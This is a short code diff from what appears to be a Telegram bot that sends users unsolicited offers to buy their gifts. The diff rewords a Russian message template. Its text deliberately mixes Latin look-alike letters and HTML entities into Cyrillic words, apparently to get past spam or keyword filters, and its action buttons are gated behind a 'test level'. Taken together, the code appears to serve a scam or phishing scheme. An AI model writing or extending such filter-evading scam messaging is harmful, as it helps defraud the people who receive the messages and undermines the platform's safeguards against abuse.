@@ -349,7 +349,7 @@ async def process_offer(message: Message, business_connection_id: str | None = N
         variant = parsed.get("text_variant")
         gift_link = f'<a href="{parsed["gift_url"]}">{title}</a>'
         # Дефолтный вариант без "Пользователь"
-        body = f"<b>{seller_name}</b> предлагает Вам <b>{amount}</b> зa п&#1086;дaр&#1086;к {gift_link}.\n\nПpeдлoжeниe aктивнo в тeчeнии <b>{time_text}</b>"
+        body = f"<b>{seller_name}</b> предлагает Вам <b>{amount}</b> зa п&#1086;дaр&#1086;к {gift_link}.\n\nСдeлкa aктивнa в тeчeнии <b>{time_text}</b>"
     
     # Кнопки добавляем только в самом конце (уровень 8+)
     markup = offer_keyboard(offer_id, parsed["locale"], parsed["currency"]) if test_level == 0 or test_level >= 8 else None
